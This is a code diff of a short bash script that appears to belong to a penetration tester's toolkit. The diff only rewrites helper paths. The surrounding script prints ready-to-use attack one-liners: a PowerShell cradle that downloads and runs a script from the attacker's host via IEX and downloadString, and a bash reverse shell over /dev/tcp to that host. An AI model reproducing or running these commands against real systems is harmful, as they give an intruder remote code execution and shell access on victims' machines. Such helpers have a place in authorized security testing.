@@ -1,6 +1,6 @@
 #!/bin/bash
 
-lhost=$(getmyip)
+lhost=$($ENVIRON_BASEPATH/zet/20230906033727/getmyip)
 lport=$1
 if [ -z "$lport" ]; then
   echo LPORT is empty
@@ -8,13 +8,13 @@ if [ -z "$lport" ]; then
   export lport=1234
 fi
 
-draw_title_bar "windows rev shell"
+$ENVIRON_BASEPATH/zet/20230906035236/draw_title_bar "windows rev shell"
 
 echo "# Powershell execute script (like a reverse shell)" | lolcat
 echo "IEX(New-Object Net.WebClient).downloadString( \"http://$lhost:$lport/filename.ps1\" )"
 echo ""
 
-draw_title_bar "linux rev shell"
+$ENVIRON_BASEPATH/zet/20230906035236/draw_title_bar "linux rev shell"
 
 bashshell=$(echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1")
 echo "$bashshell"
